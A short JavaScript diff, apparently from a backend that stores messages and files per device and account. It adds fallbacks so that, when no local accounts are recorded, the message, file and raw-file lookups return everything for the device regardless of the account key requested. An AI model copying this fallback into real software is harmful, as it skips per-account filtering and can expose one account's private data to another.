@@ -434,7 +434,6 @@ async function dashboardData() {
   });
 }
 
-// ✅ SIRF EK accountSummary function – isme fallback hai
 async function accountSummary(deviceId) {
   const [messages, devices] = await Promise.all([getMessages(deviceId), getDevices()]);
   const device = devices.find(d => d.device_id === deviceId);
@@ -465,25 +464,37 @@ async function accountSummary(deviceId) {
   return [...byAccount.values()].sort((a, b) => Number(b.last_seen || 0) - Number(a.last_seen || 0));
 }
 
+// FIX: agar local accounts khali hain toh saari messages bhejo
 async function messagesForAccount(deviceId, rawAccountKey) {
   const accountKeyValue = safeDecode(rawAccountKey);
   const messages = await getMessages(deviceId);
   const accounts = readAccounts().filter((item) => item.device_id === deviceId);
+  if (!accounts.length) {
+    return messages; // restart ke baad sab dikhe
+  }
   return messages.filter((message) => accountForMessage(message, accounts) === accountKeyValue);
 }
 
+// FIX: agar local accounts khali hain toh saari files bhejo
 function filesForAccount(deviceId, rawAccountKey) {
   const accountKeyValue = safeDecode(rawAccountKey);
   const accounts = readAccounts().filter((item) => item.device_id === deviceId);
+  if (!accounts.length) {
+    return getFiles(deviceId);
+  }
   return getFiles(deviceId).filter((file) => {
     if (file.account_key) return file.account_key === accountKeyValue;
     return fallbackAccountKey(deviceId, accounts) === accountKeyValue;
   });
 }
 
+// FIX: same for raw files
 function rawFilesForAccount(deviceId, rawAccountKey) {
   const accountKeyValue = safeDecode(rawAccountKey);
   const accounts = readAccounts().filter((item) => item.device_id === deviceId);
+  if (!accounts.length) {
+    return getRawFiles(deviceId);
+  }
   return getRawFiles(deviceId).filter((file) => {
     if (file.account_key) return file.account_key === accountKeyValue;
     return fallbackAccountKey(deviceId, accounts) === accountKeyValue;
